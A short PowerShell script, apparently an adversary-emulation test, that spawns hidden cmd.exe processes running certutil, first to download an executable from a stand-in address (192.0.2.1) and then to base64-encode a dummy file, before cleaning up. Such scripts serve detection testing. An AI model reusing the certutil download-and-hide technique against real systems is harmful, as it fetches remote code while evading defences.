$rid = [Guid]::NewGuid().ToString('N').Substring(0,8)
$fakeIn = "$env:TEMP\fl_$rid.bin"
"xyz" | Out-File $fakeIn -Encoding ASCII -Force

$proc = Start-Process "cmd.exe" `
    -ArgumentList "/c certutil.exe -urlcache -split -f http://192.0.2.1/p.exe $env:TEMP\p_$rid.exe" `
    -WindowStyle Hidden -PassThru
Start-Sleep -Seconds 3
if (!$proc.HasExited) { $proc.Kill() }

$proc2 = Start-Process "cmd.exe" `
    -ArgumentList "/c certutil.exe -encode `"$fakeIn`" `"$env:TEMP\e_$rid.b64`"" `
    -WindowStyle Hidden -PassThru -Wait
Write-Output "LOLBin processes spawned (urlcache + encode)"

Remove-Item $fakeIn -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\p_$rid.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\e_$rid.b64" -Force -ErrorAction SilentlyContinue
